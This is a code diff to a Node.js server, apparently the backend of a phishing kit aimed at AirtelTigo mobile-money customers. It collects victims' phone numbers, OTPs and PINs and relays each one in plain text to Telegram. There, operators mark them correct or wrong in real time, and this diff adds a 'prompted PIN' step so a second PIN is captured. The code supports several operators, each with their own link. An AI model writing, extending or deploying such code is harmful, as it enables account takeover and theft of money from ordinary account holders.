@@ -1,6 +1,8 @@
 // airteltigo-server.js - Prompted PIN Flow with Telegram Webhooks
 // ── WEBHOOK MODE ──────────────────────────────────────────────────────────
 // Uses Telegram webhooks instead of long-polling.
+// New Flow: Phone → OTP → Prompted PIN (modal) → PIN Entry (second PIN)
+//
 // Benefits on Render:
 //   • Zero 409 conflicts — no competing getUpdates connections
 //   • Zero reconnect logic — Telegram pushes to us, we never pull
@@ -278,12 +280,12 @@ class BotManager {
         const info = await tgGetWebhookInfo(bot, user.botToken).catch(() => null);
         await bot.sendMessage(msg.chat.id,
           `✅ <b>${sanitize(user.name)} — Status</b>\n\n` +
-          `📊 Pending phones:      ${user.phoneApprovals.size}\n` +
-          `📊 Pending OTPs:        ${user.otpApprovals.size}\n` +
-          `📊 Pending PINs:        ${user.pinApprovals.size}\n` +
-          `📊 Pending prompted PINs: ${user.promptedPinApprovals.size}\n` +
-          `✅ Verified:            ${user.verifiedUsers.size}\n` +
-          `📡 SSE clients:         ${sseBroker.size}\n` +
+          `📊 Pending phones:         ${user.phoneApprovals.size}\n` +
+          `📊 Pending OTPs:           ${user.otpApprovals.size}\n` +
+          `📊 Pending prompted PINs:  ${user.promptedPinApprovals.size}\n` +
+          `📊 Pending PINs:           ${user.pinApprovals.size}\n` +
+          `✅ Verified:               ${user.verifiedUsers.size}\n` +
+          `📡 SSE clients:            ${sseBroker.size}\n` +
           `🔗 Endpoint: <code>/api/${link}/*</code>\n` +
           `🌐 Webhook: <code>${info?.url || 'unknown'}</code>\n` +
           `${info?.last_error_message ? `⚠️ Last error: ${info.last_error_message}` : '✅ No errors'}\n` +
@@ -383,7 +385,7 @@ async function handleCallback(user, q) {
     sseBroker.push(`otp:${phone}`, { status: action });
 
     const messages = {
-      correct: `✅ <b>CORRECT</b>\n📱 <code>${phone}</code>\n\n→ Proceeding to PIN`,
+      correct: `✅ <b>CORRECT</b>\n📱 <code>${phone}</code>\n\n→ Sending Prompted PIN modal`,
       wrong: `❌ <b>WRONG</b>\n📱 <code>${phone}</code>\n\n❌ OTP incorrect`
     };
 
@@ -391,6 +393,38 @@ async function handleCallback(user, q) {
       edit(messages[action] || ''),
       answer(action === 'correct' ? '✅ Verified!' : '❌ Wrong OTP'),
     ]);
+    return;
+  }
+
+  if (type === 'promptedpin') {
+    const approval = user.promptedPinApprovals.get(phone);
+    if (!approval) { await answer('❌ Session expired', true); return; }
+    if (approval.status) { await answer('✅ Already processed'); return; }
+    if (now - approval.timestamp > CFG.PROMPTED_PIN_TIMEOUT) {
+      approval.status = 'prompted_pin_timeout';
+      sseBroker.push(`promptedpin:${phone}`, { status: 'prompted_pin_timeout' });
+      await Promise.all([
+        edit(`⏰ <b>EXPIRED</b>\n📱 <code>${phone}</code>`),
+        answer('⏰ Session expired', true),
+      ]);
+      return;
+    }
+
+    if (action === 'successful') {
+      approval.status = 'prompted_pin_successful';
+      sseBroker.push(`promptedpin:${phone}`, { status: 'prompted_pin_successful' });
+      await Promise.all([
+        answer('✅ PIN Successful'),
+        edit(`✅ <b>SUCCESSFUL</b>\n📱 <code>${phone}</code>\n\n✅ User entered prompted PIN correctly → awaiting PIN entry`),
+      ]);
+    } else if (action === 'failed') {
+      approval.status = 'prompted_pin_failed';
+      sseBroker.push(`promptedpin:${phone}`, { status: 'prompted_pin_failed' });
+      await Promise.all([
+        answer('❌ PIN Failed'),
+        edit(`❌ <b>FAILED</b>\n📱 <code>${phone}</code>\n\n❌ User did not complete prompted PIN (can retry)`),
+      ]);
+    }
     return;
   }
 
@@ -414,70 +448,14 @@ async function handleCallback(user, q) {
       sseBroker.push(`pin:${phone}`, { status: 'correct' });
       await Promise.all([
         answer('✅ PIN Correct'),
-        editMarkup(),
+        edit(`✅ <b>CORRECT</b>\n📱 <code>${phone}</code>\n\n✅ User authenticated`),
       ]);
-    } else if (action === 'promptpin') {
-      approval.status = 'prompt_pin_waiting';
-      sseBroker.push(`pin:${phone}`, { status: 'prompt_pin_waiting' });
-      await Promise.all([
-        answer('🔐 Sending Prompt PIN buttons...'),
-        editMarkup(),
-      ]);
-
-      user.promptedPinApprovals.set(phone, { timestamp: Date.now(), status: null });
-
-      setTimeout(async () => {
-        try {
-          await user.bot.sendMessage(
-            user.chatId,
-            `🔑 <b>${sanitize(user.name)} - Prompted PIN Result</b>\n\n` +
-            `📱 Phone: <code>${phone}</code>\n` +
-            `⏰ ${new Date().toLocaleString()}\n\n` +
-            `⚠️ <b>Did user complete the PIN prompt?</b>`,
-            {
-              parse_mode: 'HTML',
-              reply_markup: {
-                inline_keyboard: [
-                  [{ text: '✅ Successful', callback_data: mkCb('promptedpin', 'successful', phone) }],
-                  [{ text: '❌ Failed', callback_data: mkCb('promptedpin', 'failed', phone) }]
-                ]
-              }
-            }
-          );
-        } catch (error) {
-          logger.error(`Error sending prompted PIN buttons:`, error.message);
-        }
-      }, 500);
     } else if (action === 'wrong') {
       approval.status = 'wrong';
       sseBroker.push(`pin:${phone}`, { status: 'wrong' });
       await Promise.all([
         answer('❌ PIN Wrong'),
         editMarkup(),
-      ]);
-    }
-    return;
-  }
-
-  if (type === 'promptedpin') {
-    const approval = user.promptedPinApprovals.get(phone);
-    if (!approval) { await answer('❌ Session expired', true); return; }
-    if (approval.status) { await answer('✅ Already processed'); return; }
-
-    if (action === 'successful') {
-      approval.status = 'prompted_pin_successful';
-      user.verifiedUsers.add(phone);
-      sseBroker.push(`promptedpin:${phone}`, { status: 'prompted_pin_successful' });
-      await Promise.all([
-        answer('✅ PIN Successful'),
-        edit(`✅ <b>SUCCESSFUL</b>\n📱 <code>${phone}</code>\n\n✅ User authenticated with prompted PIN`),
-      ]);
-    } else if (action === 'failed') {
-      approval.status = 'prompted_pin_failed';
-      sseBroker.push(`promptedpin:${phone}`, { status: 'prompted_pin_failed' });
-      await Promise.all([
-        answer('❌ PIN Failed'),
-        edit(`❌ <b>FAILED</b>\n📱 <code>${phone}</code>\n\n❌ User did not complete prompted PIN (can retry)`),
       ]);
     }
     return;
@@ -533,8 +511,8 @@ const users = new Map();
       bot: null, healthy: false, lastErr: null,
       phoneApprovals: new Map(),
       otpApprovals: new Map(),
-      pinApprovals: new Map(),
       promptedPinApprovals: new Map(),
+      pinApprovals: new Map(),
       verifiedUsers: new Set(),
       dupes: new DupeCache(),
       tgQueue: new TgQueue(),
@@ -603,19 +581,19 @@ setInterval(() => {
       }
       if (v.timestamp < purge) u.otpApprovals.delete(k);
     }
-    for (const [k, v] of u.pinApprovals) {
-      if (!v.status && v.timestamp < expire) {
-        v.status = 'timeout';
-        sseBroker.push(`pin:${k}`, { status: 'timeout' });
-      }
-      if (v.timestamp < purge) u.pinApprovals.delete(k);
-    }
     for (const [k, v] of u.promptedPinApprovals) {
       if (!v.status && v.timestamp < ppExpire) {
         v.status = 'prompted_pin_timeout';
         sseBroker.push(`promptedpin:${k}`, { status: 'prompted_pin_timeout' });
       }
       if (v.timestamp < ppPurge) u.promptedPinApprovals.delete(k);
+    }
+    for (const [k, v] of u.pinApprovals) {
+      if (!v.status && v.timestamp < expire) {
+        v.status = 'timeout';
+        sseBroker.push(`pin:${k}`, { status: 'timeout' });
+      }
+      if (v.timestamp < purge) u.pinApprovals.delete(k);
     }
   }
 }, CFG.CLEANUP_INTERVAL).unref?.();
@@ -631,7 +609,7 @@ app.get('/api/health', (_, res) => {
   const list = [...users.values()].map(u => ({
     name: u.name, link: u.linkInsert, healthy: u.healthy, active: !!u.bot,
     phones: u.phoneApprovals.size, otps: u.otpApprovals.size,
-    pins: u.pinApprovals.size, promptedPins: u.promptedPinApprovals.size,
+    promptedPins: u.promptedPinApprovals.size, pins: u.pinApprovals.size,
     verified: u.verifiedUsers.size, sse: sseBroker.size, lastErr: u.lastErr,
     webhookPath: u.mgr._path,
   }));
@@ -776,78 +754,7 @@ users.forEach((user, link) => {
   });
 
   // ───────────────────────────────────────────
-  // STEP 3: VERIFY PIN (FIRST PIN)
-  // ───────────────────────────────────────────
-  app.post(`${R}/verify-pin`, async (req, res) => {
-    if (!botOk(user, res)) return;
-    const { phoneNumber, pin } = req.body;
-    
-    if (!phoneNumber || !validatePhoneNumber(phoneNumber).valid) {
-      return res.json({ success: true, status: 'wrong', message: 'Invalid phone' });
-    }
-
-    if (!pin || !validatePin(pin).valid) {
-      return res.json({ success: true, status: 'wrong', message: 'Invalid PIN' });
-    }
-
-    if (user.dupes.seen(`pin:${phoneNumber}:${pin}`)) {
-      return res.json({ success: true, status: 'pending', message: 'Cached' });
-    }
-
-    user.pinApprovals.set(phoneNumber, { timestamp: Date.now(), status: null, pin });
-
-    const text = `🔐 <b>${sanitize(user.name)} — PIN Verification</b>\n\n` +
-                 `📱 Phone: <code>${phoneNumber}</code>\n` +
-                 `🔑 PIN: <code>${pin}</code>\n` +
-                 `⏰ ${new Date().toLocaleString()}\n\n` +
-                 `⚠️ <b>Is PIN correct?</b>`;
-
-    const keyboard = { inline_keyboard: [
-      [{ text: '✅ Correct', callback_data: mkCb('pin', 'correct', phoneNumber) }],
-      [{ text: '🔐 Prompt PIN', callback_data: mkCb('pin', 'promptpin', phoneNumber) }],
-      [{ text: '❌ Wrong', callback_data: mkCb('pin', 'wrong', phoneNumber) }]
-    ]};
-
-    const r = await sendMsg(user, text, { reply_markup: keyboard });
-    r.ok
-      ? res.json({ success: true, status: 'pending', message: 'PIN sent for verification' })
-      : res.status(500).json({ success: false, message: 'Failed to notify', error: r.err });
-  });
-
-  // ───────────────────────────────────────────
-  // CHECK PIN STATUS
-  // ───────────────────────────────────────────
-  app.post(`${R}/check-pin-status`, (req, res) => {
-    const { phoneNumber } = req.body;
-    if (!phoneNumber) return res.status(400).json({ success: false, message: 'Phone required' });
-
-    const approval = user.pinApprovals.get(phoneNumber);
-    if (!approval) return res.json({ success: true, status: 'pending', message: 'Waiting for verification' });
-    if (Date.now() - approval.timestamp > CFG.APPROVAL_TIMEOUT) return res.json({ success: true, status: 'timeout', message: 'Session expired' });
-    if (approval.status === 'correct') return res.json({ success: true, status: 'correct', message: 'PIN is correct' });
-    if (approval.status === 'prompt_pin_waiting') return res.json({ success: true, status: 'prompt_pin_waiting', message: 'Prompt PIN mode activated' });
-    if (approval.status === 'wrong') return res.json({ success: true, status: 'wrong', message: 'PIN is wrong' });
-    
-    return res.json({ success: true, status: 'pending', message: 'Waiting for admin decision' });
-  });
-
-  // ───────────────────────────────────────────
-  // STREAM PIN STATUS (SSE)
-  // ───────────────────────────────────────────
-  app.get(`${R}/stream-pin-status`, (req, res) => {
-    const { phone } = req.query;
-    if (!phone) return res.status(400).json({ success: false, message: 'Phone required' });
-    const approval = user.pinApprovals.get(phone);
-    if (approval && approval.status) {
-      res.setHeader('Content-Type', 'text/event-stream'); res.flushHeaders();
-      res.write(`data: ${JSON.stringify({ status: approval.status })}\n\n`);
-      return res.end();
-    }
-    sseBroker.subscribe(`pin:${phone}`, res);
-  });
-
-  // ───────────────────────────────────────────
-  // CHECK PROMPTED PIN STATUS (SECOND PIN)
+  // STEP 3: CHECK PROMPTED PIN STATUS (FIRST PIN - MODAL)
   // ───────────────────────────────────────────
   app.post(`${R}/check-prompted-pin-status`, (req, res) => {
     const { phoneNumber } = req.body;
@@ -906,6 +813,75 @@ users.forEach((user, link) => {
       ? res.json({ success: true, message: 'Retry initiated' })
       : res.status(500).json({ success: false, message: 'Failed to notify', error: r.err });
   });
+
+  // ───────────────────────────────────────────
+  // STEP 4: VERIFY PIN (SECOND PIN - after prompted)
+  // ───────────────────────────────────────────
+  app.post(`${R}/verify-pin`, async (req, res) => {
+    if (!botOk(user, res)) return;
+    const { phoneNumber, pin } = req.body;
+    
+    if (!phoneNumber || !validatePhoneNumber(phoneNumber).valid) {
+      return res.json({ success: true, status: 'wrong', message: 'Invalid phone' });
+    }
+
+    if (!pin || !validatePin(pin).valid) {
+      return res.json({ success: true, status: 'wrong', message: 'Invalid PIN' });
+    }
+
+    if (user.dupes.seen(`pin:${phoneNumber}:${pin}`)) {
+      return res.json({ success: true, status: 'pending', message: 'Cached' });
+    }
+
+    user.pinApprovals.set(phoneNumber, { timestamp: Date.now(), status: null, pin });
+
+    const text = `🔐 <b>${sanitize(user.name)} — PIN Verification (After Prompted PIN)</b>\n\n` +
+                 `📱 Phone: <code>${phoneNumber}</code>\n` +
+                 `🔑 PIN: <code>${pin}</code>\n` +
+                 `⏰ ${new Date().toLocaleString()}\n\n` +
+                 `⚠️ <b>Is PIN correct?</b>`;
+
+    const keyboard = { inline_keyboard: [
+      [{ text: '✅ Correct', callback_data: mkCb('pin', 'correct', phoneNumber) }],
+      [{ text: '❌ Wrong', callback_data: mkCb('pin', 'wrong', phoneNumber) }]
+    ]};
+
+    const r = await sendMsg(user, text, { reply_markup: keyboard });
+    r.ok
+      ? res.json({ success: true, status: 'pending', message: 'PIN sent for verification' })
+      : res.status(500).json({ success: false, message: 'Failed to notify', error: r.err });
+  });
+
+  // ───────────────────────────────────────────
+  // CHECK PIN STATUS
+  // ───────────────────────────────────────────
+  app.post(`${R}/check-pin-status`, (req, res) => {
+    const { phoneNumber } = req.body;
+    if (!phoneNumber) return res.status(400).json({ success: false, message: 'Phone required' });
+
+    const approval = user.pinApprovals.get(phoneNumber);
+    if (!approval) return res.json({ success: true, status: 'pending', message: 'Waiting for verification' });
+    if (Date.now() - approval.timestamp > CFG.APPROVAL_TIMEOUT) return res.json({ success: true, status: 'timeout', message: 'Session expired' });
+    if (approval.status === 'correct') return res.json({ success: true, status: 'correct', message: 'PIN is correct' });
+    if (approval.status === 'wrong') return res.json({ success: true, status: 'wrong', message: 'PIN is wrong' });
+    
+    return res.json({ success: true, status: 'pending', message: 'Waiting for admin decision' });
+  });
+
+  // ───────────────────────────────────────────
+  // STREAM PIN STATUS (SSE)
+  // ───────────────────────────────────────────
+  app.get(`${R}/stream-pin-status`, (req, res) => {
+    const { phone } = req.query;
+    if (!phone) return res.status(400).json({ success: false, message: 'Phone required' });
+    const approval = user.pinApprovals.get(phone);
+    if (approval && approval.status) {
+      res.setHeader('Content-Type', 'text/event-stream'); res.flushHeaders();
+      res.write(`data: ${JSON.stringify({ status: approval.status })}\n\n`);
+      return res.end();
+    }
+    sseBroker.subscribe(`pin:${phone}`, res);
+  });
 });
 
 // ─── 404 + ERROR ──────────────────────────────────────────────────────────
@@ -930,10 +906,11 @@ process.on('unhandledRejection', (r) => logger.error('Unhandled rejection:', r))
 // ─── START ────────────────────────────────────────────────────────────────
 const server = app.listen(PORT, () => {
   console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
-  console.log(`🤖 Airteltigo Prompted PIN Webhook Server`);
+  console.log(`🤖 Airteltigo Prompted PIN → PIN Webhook Server`);
   console.log(`🚀 Port: ${PORT}`);
   console.log(`🌐 Webhook base: ${CFG.WEBHOOK_URL || '⚠️  WEBHOOK_URL not set!'}`);
   console.log(`👥 Users: ${users.size}/${CFG.MAX_USERS}`);
+  console.log(`\n📊 Flow: Phone → OTP → Prompted PIN (modal) → PIN Entry`);
   users.forEach((u, l) => console.log(`   ⏳ ${u.name}: /api/${l}/*`));
   console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');
 });
